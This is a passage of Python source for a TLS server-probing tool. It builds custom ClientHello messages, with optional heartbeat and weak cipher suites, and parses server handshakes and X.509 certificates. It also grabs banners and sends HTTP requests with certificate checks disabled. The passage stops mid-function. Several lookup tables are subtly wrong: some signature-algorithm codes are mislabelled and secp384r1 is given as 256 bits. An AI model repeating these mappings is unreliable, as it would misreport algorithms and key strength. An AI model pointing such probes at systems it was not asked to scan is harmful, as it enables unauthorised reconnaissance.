    0xc00b: ("TLS_ECDH_RSA_WITH_NULL_SHA", 0, "ECDH"),
    0xc00c: ("TLS_ECDH_RSA_WITH_RC4_128_SHA", 128, "ECDH"),
    0xc00d: ("TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA", 168, "ECDH"),
    0xc00e: ("TLS_ECDH_RSA_WITH_AES_128_CBC_SHA", 128, "ECDH"),
    0xc00f: ("TLS_ECDH_RSA_WITH_AES_256_CBC_SHA", 256, "ECDH"),
    0xc010: ("TLS_ECDHE_RSA_WITH_NULL_SHA", 0, "ECDHE"),
    0xc011: ("TLS_ECDHE_RSA_WITH_RC4_128_SHA", 128, "ECDHE"),
    0xc012: ("TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA", 168, "ECDHE"),
    0xc013: ("TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA", 128, "ECDHE"),
    0xc014: ("TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA", 256, "ECDHE"),
    0xc015: ("TLS_ECDH_anon_WITH_NULL_SHA", 0, "ECDH-anon"),
    0xc016: ("TLS_ECDH_anon_WITH_RC4_128_SHA", 128, "ECDH-anon"),
    0xc017: ("TLS_ECDH_anon_WITH_3DES_EDE_CBC_SHA", 168, "ECDH-anon"),
    0xc018: ("TLS_ECDH_anon_WITH_AES_128_CBC_SHA", 128, "ECDH-anon"),
    0xc019: ("TLS_ECDH_anon_WITH_AES_256_CBC_SHA", 256, "ECDH-anon"),
    0xc023: ("TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256", 128, "ECDHE"),
    0xc024: ("TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384", 256, "ECDHE"),
    0xc027: ("TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256", 128, "ECDHE"),
    0xc028: ("TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384", 256, "ECDHE"),
    0xc02b: ("TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256", 128, "ECDHE"),
    0xc02c: ("TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384", 256, "ECDHE"),
    0xc02f: ("TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256", 128, "ECDHE"),
    0xc030: ("TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384", 256, "ECDHE"),
    0xcca8: ("TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256", 256, "ECDHE"),
    0xcca9: ("TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256", 256, "ECDHE"),
    0xccaa: ("TLS_DHE_RSA_WITH_CHACHA20_POLY1305_SHA256", 256, "DHE"),
}

GROUP_NAMES = {
    1: "sect163k1", 2: "sect163r1", 3: "sect163r2", 4: "sect193r1", 5: "sect193r2",
    6: "sect233k1", 7: "sect233r1", 8: "sect239k1", 9: "sect283k1", 10: "sect283r1",
    11: "sect409k1", 12: "sect409r1", 13: "sect571k1", 14: "sect571r1", 15: "secp160k1",
    16: "secp160r1", 17: "secp160r2", 18: "secp192k1", 19: "secp192r1", 20: "secp224k1",
    21: "secp224r1", 22: "secp256k1", 23: "secp256r1", 24: "secp384r1", 25: "secp521r1",
    26: "brainpoolP256r1", 27: "brainpoolP384r1", 28: "brainpoolP512r1", 29: "x25519",
    30: "x448", 31: "brainpoolP256r1tls13", 32: "brainpoolP384r1tls13",
    33: "brainpoolP512r1tls13",
    0x0100: "ffdhe2048", 0x0101: "ffdhe3072", 0x0102: "ffdhe4096",
    0x0103: "ffdhe6144", 0x0104: "ffdhe8192",
}

SIG_ALG_NAMES = {
    0x0201: "rsa_pkcs1_sha1", 0x0202: "dsa_sha1", 0x0203: "ecdsa_sha1",
    0x0204: "rsa_pkcs1_sha224", 0x0205: "dsa_sha224", 0x0206: "ecdsa_sha224",
    0x0207: "rsa_pkcs1_sha256", 0x0208: "dsa_sha256", 0x0209: "ecdsa_secp256r1_sha256",
    0x020a: "rsa_pkcs1_sha384", 0x020b: "dsa_sha384", 0x020c: "ecdsa_secp384r1_sha384",
    0x020d: "rsa_pkcs1_sha512", 0x020e: "dsa_sha512", 0x020f: "ecdsa_secp521r1_sha512",
    0x0401: "rsa_pss_rsae_sha256", 0x0402: "rsa_pss_rsae_sha384", 0x0403: "rsa_pss_rsae_sha512",
    0x0501: "ecdsa_sha1", 0x0503: "ecdsa_sha1",
    0x0601: "rsa_pss_pss_sha256", 0x0602: "rsa_pss_pss_sha384", 0x0603: "rsa_pss_pss_sha512",
    0x0704: "ed25519", 0x0705: "ed448",
    0x0804: "rsa_pss_rsae_sha256", 0x0805: "rsa_pss_rsae_sha384", 0x0806: "rsa_pss_rsae_sha512",
    0x0807: "ed25519", 0x0808: "ed448",
    0x0809: "rsa_pss_pss_sha256", 0x080a: "rsa_pss_pss_sha384", 0x080b: "rsa_pss_pss_sha512",
}

ALERT_NAMES = {
    0: "close_notify", 10: "unexpected_message", 20: "bad_record_mac",
    21: "decryption_failed", 22: "record_overflow", 30: "decompression_failure",
    40: "handshake_failure", 41: "no_certificate", 42: "bad_certificate",
    43: "unsupported_certificate", 44: "certificate_revoked", 45: "certificate_expired",
    46: "certificate_unknown", 47: "illegal_parameter", 48: "unknown_ca",
    49: "access_denied", 50: "decode_error", 51: "decrypt_error",
    60: "export_restriction", 70: "protocol_version", 71: "insufficient_security",
    80: "internal_error", 86: "inappropriate_fallback", 90: "user_canceled",
    100: "no_renegotiation", 109: "missing_extension", 110: "unsupported_extension",
    111: "certificate_unobtainable", 112: "unrecognized_name",
    113: "bad_certificate_status_response", 114: "bad_certificate_hash_value",
    115: "unknown_psk_identity", 116: "certificate_required", 120: "no_application_protocol",
}

COMPRESSION_NAMES = {0: "null", 1: "deflate", 64: "lzs"}

VERSION_NAMES = {
    0x0002: "SSLv2", 0x0300: "SSLv3", 0x0301: "TLS1.0", 0x0302: "TLS1.1",
    0x0303: "TLS1.2", 0x0304: "TLS1.3", 0xfeff: "DTLS1.0", 0xfefd: "DTLS1.2",
}


def cipher_name(cid):
    return CIPHER_NAMES.get(cid, ("UNKNOWN_0x%04x" % cid, 0, "?"))[0]


def cipher_bits(cid):
    return CIPHER_NAMES.get(cid, ("?", 0, "?"))[1]


def cipher_kx(cid):
    return CIPHER_NAMES.get(cid, ("?", 0, "?"))[2]


def group_name(gid):
    return GROUP_NAMES.get(gid, "unknown_0x%04x" % gid)


def sig_alg_name(sid):
    return SIG_ALG_NAMES.get(sid, "unknown_0x%04x" % sid)


def alert_name(aid):
    return ALERT_NAMES.get(aid, "unknown_%d" % aid)


def version_name(v):
    return VERSION_NAMES.get(v, "0x%04x" % v)


def ext_name(eid):
    return EXT_NAMES.get(eid, "unknown_0x%04x" % eid)


def compression_name(cid):
    return COMPRESSION_NAMES.get(cid, "unknown_%d" % cid)


def pack_u8(n):
    return struct.pack(">B", n & 0xff)


def pack_u16(n):
    return struct.pack(">H", n & 0xffff)


def pack_u24(n):
    return struct.pack(">I", n & 0xffffff)[1:]


def unpack_u16(b, off=0):
    return struct.unpack(">H", b[off:off + 2])[0]


def unpack_u24(b, off=0):
    return int.from_bytes(b[off:off + 3], "big")


def rand_bytes(n):
    if _HAS_CRYPTO:
        return get_random_bytes(n)
    return os.urandom(n)


class TLSRecord:
    def __init__(self, content_type, version, payload):
        self.content_type = content_type
        self.version = version
        self.payload = payload

    def encode(self):
        return (struct.pack(">BHH", self.content_type, self.version,
                            len(self.payload)) + self.payload)

    @classmethod
    def decode(cls, data, offset=0):
        if len(data) < offset + 5:
            return None, offset
        ct = data[offset]
        ver = struct.unpack(">H", data[offset + 1:offset + 3])[0]
        ln = struct.unpack(">H", data[offset + 3:offset + 5])[0]
        if len(data) < offset + 5 + ln:
            return None, offset
        return cls(ct, ver, data[offset + 5:offset + 5 + ln]), offset + 5 + ln


DEFAULT_GROUPS = [29, 23, 24, 25, 30, 22, 19, 18, 26, 27, 28, 256, 257, 258]
DEFAULT_SIG_ALGS = [0x0403, 0x0503, 0x0603, 0x0401, 0x0501, 0x0601,
                    0x0807, 0x0808, 0x0804, 0x0805, 0x0806, 0x0809, 0x080a, 0x080b,
                    0x0201, 0x0203]

DEFAULT_TLS12_CIPHERS = [
    0xc02f, 0xc030, 0xc02b, 0xc02c, 0xcca8, 0xcca9, 0xccaa,
    0xc013, 0xc014, 0xc009, 0xc00a, 0x009c, 0x009d, 0x002f, 0x0035,
    0x0033, 0x0039, 0x0067, 0x006b, 0x009e, 0x009f,
    0xc027, 0xc028, 0xc023, 0xc024, 0xc012, 0xc008,
    0x0016, 0x0013, 0x000a, 0x0005, 0x0004,
]
DEFAULT_TLS13_CIPHERS = [0x1301, 0x1302, 0x1303]


def build_client_hello(version, cipher_ids, sni=None, alpn=None, groups=None,
                        sig_algs=None, random_bytes=None, session_id=None,
                        extra_extensions=None, tls13=False, keyshare_group=29,
                        supported_versions=None, ems=True, heartbeat=False,
                        session_ticket=None, ec_point_formats=None,
                        padding_len=0):
    if random_bytes is None:
        random_bytes = rand_bytes(32)
    if session_id is None:
        session_id = rand_bytes(32)
    exts = []
    if sni:
        try:
            name_bytes = (sni.encode("idna") if any(ord(c) > 127 for c in sni)
                          else sni.encode("ascii", "ignore"))
        except Exception:
            name_bytes = sni.encode("ascii", "ignore")
        sni_data = pack_u16(len(name_bytes) + 3) + b"\x00" + pack_u16(len(name_bytes)) + name_bytes
        exts.append((EXT_SERVER_NAME, sni_data))
    if groups:
        gd = pack_u16(len(groups) * 2) + b"".join(pack_u16(g) for g in groups)
        exts.append((EXT_SUPPORTED_GROUPS, gd))
    if ec_point_formats is None:
        ec_point_formats = [0]
    exts.append((EXT_EC_POINT_FORMATS, pack_u8(len(ec_point_formats)) +
                 b"".join(pack_u8(p) for p in ec_point_formats)))
    if sig_algs:
        exts.append((EXT_SIGNATURE_ALGORITHMS, pack_u16(len(sig_algs) * 2) +
                     b"".join(pack_u16(s) for s in sig_algs)))
    if ems:
        exts.append((EXT_EXTENDED_MASTER_SECRET, b""))
    if session_ticket is not None:
        exts.append((EXT_SESSION_TICKET, session_ticket))
    if heartbeat:
        exts.append((EXT_HEARTBEAT, pack_u8(1)))
    if alpn:
        ad = b""
        for p in alpn:
            pb = p.encode("ascii", "ignore")
            ad += pack_u8(len(pb)) + pb
        exts.append((EXT_ALPN, pack_u16(len(ad)) + ad))
    if tls13:
        sv = pack_u8(len(supported_versions or [0x0304, 0x0303]) * 2) + \
             b"".join(pack_u16(v) for v in (supported_versions or [0x0304, 0x0303]))
        exts.append((EXT_SUPPORTED_VERSIONS, sv))
        ks = pack_u16(2 + 2 + 32) + pack_u16(keyshare_group) + pack_u16(32) + rand_bytes(32)
        exts.append((EXT_KEY_SHARE, ks))
        exts.append((EXT_PSK_KEY_EXCHANGE_MODES, pack_u8(1) + pack_u8(1)))
        exts.append((EXT_SIGNATURE_ALGORITHMS_CERT,
                     pack_u16(len(sig_algs or [0x0403]) * 2) +
                     b"".join(pack_u16(s) for s in (sig_algs or [0x0403]))))
        exts.append((EXT_POST_HANDSHAKE_AUTH, b""))
    if extra_extensions:
        exts.extend(extra_extensions)
    if padding_len > 0:
        exts.append((EXT_PADDING, b"\x00" * padding_len))
    ext_bytes = b""
    for eid, ed in exts:
        ext_bytes += pack_u16(eid) + pack_u16(len(ed)) + ed
    body = pack_u16(version) + random_bytes + pack_u8(len(session_id)) + session_id
    body += pack_u16(len(cipher_ids) * 2) + b"".join(pack_u16(c) for c in cipher_ids)
    body += pack_u8(1) + pack_u8(0)
    body += pack_u16(len(ext_bytes)) + ext_bytes
    hs = pack_u8(HS_CLIENT_HELLO) + pack_u24(len(body)) + body
    rec_ver = 0x0301 if tls13 else version
    return TLSRecord(CT_HANDSHAKE, rec_ver, hs).encode()


class ParsedExtension:
    def __init__(self, eid, data):
        self.id = eid
        self.name = ext_name(eid)
        self.data = data
        self.decoded = {}
        self._decode()

    def _decode(self):
        e = self.id
        d = self.data
        try:
            if e == EXT_SERVER_NAME and len(d) >= 2:
                off = 2
                items = []
                while off + 3 <= len(d):
                    nl = unpack_u16(d, off + 1)
                    items.append(d[off + 3:off + 3 + nl].decode("ascii", "replace"))
                    off += 3 + nl
                self.decoded["names"] = items
            elif e == EXT_SUPPORTED_GROUPS and len(d) >= 2:
                gl = unpack_u16(d, 0)
                groups = []
                off = 2
                while off + 2 <= len(d) and off - 2 < gl:
                    g = unpack_u16(d, off)
                    groups.append({"id": g, "name": group_name(g)})
                    off += 2
                self.decoded["groups"] = groups
            elif e == EXT_EC_POINT_FORMATS and len(d) >= 1:
                self.decoded["point_formats"] = list(d[1:1 + d[0]])
            elif e == EXT_SIGNATURE_ALGORITHMS and len(d) >= 2:
                sl = unpack_u16(d, 0)
                algs = []
                off = 2
                while off + 2 <= len(d) and off - 2 < sl:
                    s = unpack_u16(d, off)
                    algs.append({"id": s, "name": sig_alg_name(s)})
                    off += 2
                self.decoded["algorithms"] = algs
            elif e == EXT_ALPN and len(d) >= 2:
                ll = unpack_u16(d, 0)
                off = 2
                protos = []
                while off < 2 + ll and off < len(d):
                    pl = d[off]
                    protos.append(d[off + 1:off + 1 + pl].decode("ascii", "replace"))
                    off += 1 + pl
                self.decoded["protocols"] = protos
            elif e == EXT_SUPPORTED_VERSIONS:
                if len(d) >= 1:
                    first = d[0]
                    if first == 0x02 and len(d) >= 3:
                        v = unpack_u16(d, 1)
                        self.decoded["selected"] = version_name(v)
                        self.decoded["selected_id"] = v
                    elif first + 1 <= len(d):
                        cnt = first // 2
                        vs = []
                        off = 1
                        for _ in range(cnt):
                            vs.append(version_name(unpack_u16(d, off)))
                            off += 2
                        self.decoded["versions"] = vs
            elif e == EXT_RENEGOTIATION_INFO and len(d) >= 1:
                self.decoded["renegotiated"] = True
            elif e == EXT_SESSION_TICKET:
                self.decoded["ticket_len"] = len(d)
            elif e == EXT_HEARTBEAT and len(d) >= 1:
                self.decoded["mode"] = ("peer_allowed_to_send" if d[0] == 1
                                         else "peer_not_allowed_to_send")
            elif e == EXT_KEY_SHARE and len(d) >= 4:
                first = unpack_u16(d, 0)
                if first == 2 and len(d) >= 4:
                    g = unpack_u16(d, 2)
                    self.decoded["selected_group"] = {"id": g, "name": group_name(g)}
                else:
                    shares = []
                    off = 2
                    while off + 4 <= len(d):
                        g = unpack_u16(d, off)
                        ln = unpack_u16(d, off + 2)
                        shares.append({"id": g, "name": group_name(g), "len": ln})
                        off += 4 + ln
                    self.decoded["shares"] = shares
            elif e == EXT_ENCRYPTED_SERVER_NAME and len(d) >= 2:
                self.decoded["ech_bytes_len"] = len(d)
        except Exception:
            self.decoded["decode_error"] = True


class ServerHello:
    def __init__(self):
        self.version = 0
        self.random = b""
        self.session_id = b""
        self.cipher_suite = 0
        self.compression = 0
        self.extensions = []

    def parse(self, data):
        if len(data) < 2 + 32 + 1:
            return False
        try:
            self.version = unpack_u16(data, 0)
            self.random = data[2:34]
            sid_len = data[34]
            off = 35
            self.session_id = data[off:off + sid_len]
            off += sid_len
            self.cipher_suite = unpack_u16(data, off)
            off += 2
            self.compression = data[off]
            off += 1
            if off + 2 <= len(data):
                ext_len = unpack_u16(data, off)
                off += 2
                end = min(off + ext_len, len(data))
                while off + 4 <= end:
                    eid = unpack_u16(data, off)
                    el = unpack_u16(data, off + 2)
                    self.extensions.append(
                        ParsedExtension(eid, data[off + 4:off + 4 + el]))
                    off += 4 + el
            return True
        except Exception:
            return False

    def ext_by_id(self, eid):
        for e in self.extensions:
            if e.id == eid:
                return e
        return None


def parse_handshake_records(payload):
    out = []
    i = 0
    while i + 4 <= len(payload):
        ht = payload[i]
        ln = unpack_u24(payload, i + 1)
        body = payload[i + 4:i + 4 + ln]
        if len(body) < ln:
            break
        out.append((ht, body))
        i += 4 + ln
    return out


def extract_server_hello(records):
    for r in records:
        if r.content_type == CT_HANDSHAKE:
            for ht, body in parse_handshake_records(r.payload):
                if ht == HS_SERVER_HELLO:
                    sh = ServerHello()
                    if sh.parse(body):
                        return sh
    return None


def extract_alerts(records):
    out = []
    for r in records:
        if r.content_type == CT_ALERT:
            i = 0
            while i + 2 <= len(r.payload):
                out.append((r.payload[i], r.payload[i + 1],
                            alert_name(r.payload[i + 1])))
                i += 2
    return out


class CertificateMessage:
    def __init__(self):
        self.certs = []

    def parse(self, body, tls13=False):
        try:
            if tls13:
                ctx_len = body[0]
                off = 1 + ctx_len
                if off + 3 > len(body):
                    return False
                list_len = unpack_u24(body, off)
                off += 3
                end = min(off + list_len, len(body))
                while off + 3 <= end:
                    cert_len = unpack_u24(body, off)
                    off += 3
                    self.certs.append(body[off:off + cert_len])
                    off += cert_len + 2
            else:
                if len(body) < 3:
                    return False
                list_len = unpack_u24(body, 0)
                off = 3
                end = min(off + list_len, len(body))
                while off + 3 <= end:
                    cert_len = unpack_u24(body, off)
                    off += 3
                    self.certs.append(body[off:off + cert_len])
                    off += cert_len
            return True
        except Exception:
            return False


def extract_certificate(records, tls13=False):
    for r in records:
        if r.content_type != CT_HANDSHAKE:
            continue
        for ht, body in parse_handshake_records(r.payload):
            if ht == HS_CERTIFICATE:
                cm = CertificateMessage()
                if cm.parse(body, tls13=tls13):
                    return cm
    return None


class ServerKeyExchangeMsg:
    def __init__(self):
        self.named_curve_id = None
        self.pubkey = b""
        self.signature_alg = None
        self.signature_alg_name = None
        self.signature = b""
        self.kx_type = "unknown"
        self.dh_p = b""
        self.dh_g = b""
        self.dh_y = b""

    def parse(self, body, cipher=0):
        kx = cipher_kx(cipher)
        try:
            if kx in ("ECDHE", "ECDH"):
                self.kx_type = "ECDHE"
                self.named_curve_id = unpack_u16(body, 1)
                pk_len = body[3]
                self.pubkey = body[4:4 + pk_len]
                off = 4 + pk_len
                if off + 2 <= len(body):
                    self.signature_alg = unpack_u16(body, off)
                    self.signature_alg_name = sig_alg_name(self.signature_alg)
                    off += 2
                if off + 2 <= len(body):
                    sig_len = unpack_u16(body, off)
                    off += 2
                    self.signature = body[off:off + sig_len]
            elif kx == "DHE":
                self.kx_type = "DHE"
                dh_p_len = unpack_u16(body, 0)
                self.dh_p = body[2:2 + dh_p_len]
                off = 2 + dh_p_len
                dh_g_len = unpack_u16(body, off)
                self.dh_g = body[off + 2:off + 2 + dh_g_len]
                off += 2 + dh_g_len
                dh_y_len = unpack_u16(body, off)
                self.dh_y = body[off + 2:off + 2 + dh_y_len]
                off += 2 + dh_y_len
                if off + 2 <= len(body):
                    self.signature_alg = unpack_u16(body, off)
                    self.signature_alg_name = sig_alg_name(self.signature_alg)
                    off += 2
                if off + 2 <= len(body):
                    sig_len = unpack_u16(body, off)
                    off += 2
                    self.signature = body[off:off + sig_len]
            else:
                self.kx_type = "RSA" if kx == "RSA" else "unknown"
            return True
        except Exception:
            return False


def extract_server_key_exchange(records, cipher):
    for r in records:
        if r.content_type != CT_HANDSHAKE:
            continue
        for ht, body in parse_handshake_records(r.payload):
            if ht == HS_SERVER_KEY_EXCHANGE:
                ske = ServerKeyExchangeMsg()
                if ske.parse(body, cipher=cipher):
                    return ske
    return None


def read_tls_records(sock, timeout=3.0):
    records = []
    data = b""
    end = time.time() + timeout
    while time.time() < end:
        try:
            sock.settimeout(max(0.1, end - time.time()))
            chunk = sock.recv(8192)
            if not chunk:
                break
            data += chunk
            off = 0
            while True:
                rec, off2 = TLSRecord.decode(data, off)
                if rec is None:
                    break
                records.append(rec)
                off = off2
            if off > 0:
                data = data[off:]
            if records:
                if records[-1].content_type == CT_ALERT:
                    break
                done = False
                for r in records:
                    if r.content_type == CT_HANDSHAKE:
                        for ht, _ in parse_handshake_records(r.payload):
                            if ht == HS_SERVER_HELLO_DONE:
                                done = True
                                break
                if done:
                    break
        except socket.timeout:
            break
        except Exception:
            break
    return records, data


def tls_probe(host, port, version, ciphers, timeout=3.0, sni=None, alpn=None,
               tls13=False, groups=None, sig_algs=None, extra_extensions=None,
               session_ticket=None, padding_len=0):
    result = {"sent_bytes": 0, "received_bytes": 0, "elapsed": 0.0, "error": "",
              "server_hello": None, "alerts": [], "records": [],
              "certificate": None, "ske": None}
    t0 = time.time()
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        try:
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except Exception:
            pass
        s.connect((host, port))
        count("connections")
        hello = build_client_hello(
            version=version, cipher_ids=ciphers, sni=sni, alpn=alpn,
            groups=groups or DEFAULT_GROUPS, sig_algs=sig_algs or DEFAULT_SIG_ALGS,
            tls13=tls13, extra_extensions=extra_extensions,
            session_ticket=session_ticket, padding_len=padding_len,
        )
        result["sent_bytes"] = len(hello)
        s.sendall(hello)
        records, _ = read_tls_records(s, timeout=timeout)
        result["received_bytes"] = sum(len(r.payload) + 5 for r in records)
        result["records"] = records
        sh = extract_server_hello(records)
        result["server_hello"] = sh
        result["alerts"] = extract_alerts(records)
        if sh:
            result["certificate"] = extract_certificate(records)
            result["ske"] = extract_server_key_exchange(records, sh.cipher_suite)
    except socket.timeout:
        result["error"] = "timeout"
    except Exception as e:
        result["error"] = "%s: %s" % (type(e).__name__, e)
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass
    result["elapsed"] = time.time() - t0
    return result


def probe_tcp_options(host, port, timeout=3.0):
    out = {"ttl": None, "window": None, "mss": None, "error": ""}
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        count("connections")
        try:
            out["ttl"] = s.getsockopt(socket.IPPROTO_IP, socket.IP_TTL)
        except Exception:
            pass
        try:
            out["window"] = s.getsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF)
        except Exception:
            pass
        try:
            out["mss"] = s.getsockopt(socket.IPPROTO_TCP, socket.TCP_MAXSEG)
        except Exception:
            pass
        s.close()
    except Exception as e:
        out["error"] = str(e)
    return out


def detect_service_banner(host, port, timeout=2.0):
    t0 = time.time()
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        count("connections")
        s.settimeout(timeout)
        try:
            data = s.recv(512)
        except socket.timeout:
            data = b""
        return data, time.time() - t0, ""
    except Exception as e:
        return b"", time.time() - t0, str(e)
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


def http_get(host, port, path="/", timeout=3.0, headers=None, method="GET",
              body=b"", use_tls=False, sni=None):
    out = {"status": None, "reason": "", "version": "", "headers": [],
           "body": b"", "raw": b"", "elapsed": 0.0, "error": ""}
    t0 = time.time()
    s = None
    try:
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(["h2", "http/1.1"])
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((host, port))
            count("connections")
            s = ctx.wrap_socket(s, server_hostname=sni or host)
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((host, port))
            count("connections")
        hdr = {"Host": sni or host, "User-Agent": "sRX87/1.0",
               "Connection": "close", "Accept": "*/*"}
        if headers:
            hdr.update(headers)
        hdr_lines = "".join("%s: %s\r\n" % (k, v) for k, v in hdr.items())
        req = ("%s %s HTTP/1.1\r\n" % (method, path)).encode("ascii") + \
              hdr_lines.encode("ascii") + b"\r\n" + body
        s.sendall(req)
        data = b""
        end = time.time() + timeout
        while time.time() < end:
            try:
                s.settimeout(max(0.05, end - time.time()))
                chunk = s.recv(65536)
                if not chunk:
                    break
                data += chunk
                if len(data) > 2 * 1024 * 1024:
                    break
            except socket.timeout:
                break
            except Exception:
                break
        out["raw"] = data
        head, _, body_b = data.partition(b"\r\n\r\n")
        lines = head.split(b"\r\n")
        if lines:
            parts = lines[0].decode("iso-8859-1", "replace").split(" ", 2)
            if len(parts) >= 2:
                out["version"] = parts[0]
                try:
                    out["status"] = int(parts[1])
                except Exception:
                    pass
                if len(parts) >= 3:
                    out["reason"] = parts[2]
            for ln in lines[1:]:
                h, _, v = ln.decode("iso-8859-1", "replace").partition(":")
                out["headers"].append((h.strip(), v.strip()))
        out["body"] = body_b
    except Exception as e:
        out["error"] = "%s: %s" % (type(e).__name__, e)
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass
    out["elapsed"] = time.time() - t0
    return out


class DERReader:
    def __init__(self, data, offset=0):
        self.data = data
        self.off = offset

    def read_byte(self):
        b = self.data[self.off]
        self.off += 1
        return b

    def read_len(self):
        b = self.read_byte()
        if b < 0x80:
            return b
        n = b & 0x7f
        if n == 0 or n > 4:
            raise ValueError("bad length")
        v = 0
        for _ in range(n):
            v = (v << 8) | self.read_byte()
        return v

    def read_tag(self, expected=None):
        tag = self.read_byte()
        if expected is not None and tag != expected:
            raise ValueError("tag 0x%02x != 0x%02x" % (tag, expected))
        ln = self.read_len()
        v = self.data[self.off:self.off + ln]
        self.off += ln
        return tag, v

    def peek_tag(self):
        return self.data[self.off]

    def remaining(self):
        return len(self.data) - self.off


_OID_MAP = {
    b"\x55\x04\x03": "CN", b"\x55\x04\x06": "C", b"\x55\x04\x07": "L",
    b"\x55\x04\x08": "ST", b"\x55\x04\x0a": "O", b"\x55\x04\x0b": "OU",
    b"\x55\x04\x05": "serialNumber", b"\x55\x04\x0c": "title",
    b"\x55\x04\x42": "GN", b"\x55\x04\x41": "SN",
    b"\x2a\x86\x48\x86\xf7\x0d\x01\x09\x01": "emailAddress",
}


def _oid_to_name(oid):
    return _OID_MAP.get(oid, "OID:" + oid.hex())


def _parse_time(v):
    try:
        s = v.decode("ascii")
        if v[0] == 0x17:
            return datetime.strptime(s, "%y%m%d%H%M%SZ").replace(tzinfo=timezone.utc)
        if v[0] == 0x18:
            return datetime.strptime(s, "%Y%m%d%H%M%SZ").replace(tzinfo=timezone.utc)
    except Exception:
        return None
    return None


def _parse_x509_name(raw):
    out = []
    try:
        r = DERReader(raw)
        _, seq = r.read_tag(0x30)
        r2 = DERReader(seq)
        while r2.remaining() > 0:
            _, setv = r2.read_tag(0x31)
            r3 = DERReader(setv)
            _, seqv = r3.read_tag(0x30)
            r4 = DERReader(seqv)
            _, oid = r4.read_tag(0x06)
            try:
                _, val = r4.read_tag()
                s = val.decode("utf-8", "replace")
            except Exception:
                s = ""
            out.append((_oid_to_name(oid), s))
    except Exception:
        pass
    return out


_SIG_OID_MAP = {
    b"\x2a\x86\x48\x86\xf7\x0d\x01\x01\x05": "sha1WithRSAEncryption",
    b"\x2a\x86\x48\x86\xf7\x0d\x01\x01\x0b": "sha256WithRSAEncryption",
    b"\x2a\x86\x48\x86\xf7\x0d\x01\x01\x0c": "sha384WithRSAEncryption",
    b"\x2a\x86\x48\x86\xf7\x0d\x01\x01\x0d": "sha512WithRSAEncryption",
    b"\x2a\x86\x48\x86\xf7\x0d\x01\x01\x0e": "sha224WithRSAEncryption",
    b"\x2a\x86\x48\xce\x3d\x04\x01": "ecdsa-with-SHA1",
    b"\x2a\x86\x48\xce\x3d\x04\x03\x02": "ecdsa-with-SHA256",
    b"\x2a\x86\x48\xce\x3d\x04\x03\x03": "ecdsa-with-SHA384",
    b"\x2a\x86\x48\xce\x3d\x04\x03\x04": "ecdsa-with-SHA512",
    b"\x2b\x65\x70": "Ed25519",
    b"\x2b\x65\x71": "Ed448",
    b"\x2a\x86\x48\x86\xf7\x0d\x01\x01\x0a": "rsaPSS",
    b"\x60\x86\x48\x01\x65\x03\x04\x02\x01": "dsa-with-SHA1",
    b"\x60\x86\x48\x01\x65\x03\x04\x03\x02": "dsa-with-SHA256",
}


def _sig_oid_name(oid):
    return _SIG_OID_MAP.get(oid, "OID:" + oid.hex() if oid else "")


def _ec_curve_bits(curve_oid):
    return {
        b"\x2a\x86\x48\xce\x3d\x03\x01\x07": 256,
        b"\x2b\x81\x04\x00\x0a": 256,
        b"\x2b\x81\x04\x00\x22": 256,
        b"\x2b\x81\x04\x00\x23": 384,
        b"\x2b\x81\x04\x00\x24": 384,
        b"\x2a\x86\x48\xce\x3d\x03\x01\x22": 384,
        b"\x2b\x81\x04\x00\x25": 521,
    }.get(curve_oid, 0)


def _parse_key_usage(val):
    try:
        r = DERReader(val)
        _, bs = r.read_tag(0x03)
        if not bs:
            return []
        unused = bs[0]
        bits = bs[1:]
        names = ["digitalSignature", "nonRepudiation", "keyEncipherment",
                 "dataEncipherment", "keyAgreement", "keyCertSign", "cRLSign",
                 "encipherOnly", "decipherOnly"]
        out = []
        for i in range(8 * len(bits) - unused):
            if bits[i // 8] & (1 << (7 - (i % 8))):
                if i < len(names):
                    out.append(names[i])
        return out
    except Exception:
        return []


def _parse_eku(val):
    try:
        r = DERReader(val)
        _, seq = r.read_tag(0x30)
        sr = DERReader(seq)
        out = []
        while sr.remaining() > 0:
            _, oid = sr.read_tag(0x06)
            out.append({
                b"\x2b\x06\x01\x05\x05\x07\x03\x01": "serverAuth",
                b"\x2b\x06\x01\x05\x05\x07\x03\x02": "clientAuth",
                b"\x2b\x06\x01\x05\x05\x07\x03\x03": "codeSigning",
                b"\x2b\x06\x01\x05\x05\x07\x03\x04": "emailProtection",
                b"\x2b\x06\x01\x05\x05\x07\x03\x08": "timeStamping",
                b"\x2b\x06\x01\x05\x05\x07\x03\x09": "ocspSigning",
            }.get(oid, "OID:" + oid.hex()))
        return out
    except Exception:
        return []


def _parse_dp_or_aia(val):
    out = []
    try:
        r = DERReader(val)
        tag, body = r.read_tag()
        rr = DERReader(body)
        while rr.remaining() > 0:
            t, v = rr.read_tag()
            if t == 0x30:
                rr2 = DERReader(v)
                while rr2.remaining() > 0:
                    t2 = rr2.peek_tag()
                    if t2 == 0x06:
                        rr2.read_tag(0x06)
                    elif t2 == 0x86:
